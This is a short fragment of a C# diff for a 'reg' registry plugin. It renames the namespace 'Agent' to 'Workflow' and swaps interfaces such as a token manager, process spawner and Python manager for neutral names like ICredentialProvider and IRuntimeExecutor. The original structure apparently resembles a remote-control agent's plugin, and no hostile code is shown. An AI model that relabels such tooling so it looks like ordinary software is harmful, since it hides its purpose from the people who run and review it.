@@ -1,21 +1,21 @@
-﻿using Agent.Interfaces;
-using Agent.Models;
-using Agent.Utilities;
+using Workflow.Contracts;
+using Workflow.Models;
+using Workflow.Utilities;
 using Microsoft.Win32;
 using reg;
 using System.Text;
 using System.Text.Json;
 
-namespace Agent
+namespace Workflow
 {
-    public class Plugin : IPlugin
+    public class Plugin : IModule
     {
         public string Name => "reg";
-        private IAgentConfig config { get; set; }
-        private IMessageManager messageManager { get; set; }
+        private IServiceConfig config { get; set; }
+        private IDataBroker messageManager { get; set; }
         private ILogger logger { get; set; }
-        private ITokenManager tokenManager { get; set; }
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
+        private ICredentialProvider tokenManager { get; set; }
+        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
         {
             this.messageManager = messageManager;
             this.config = config;
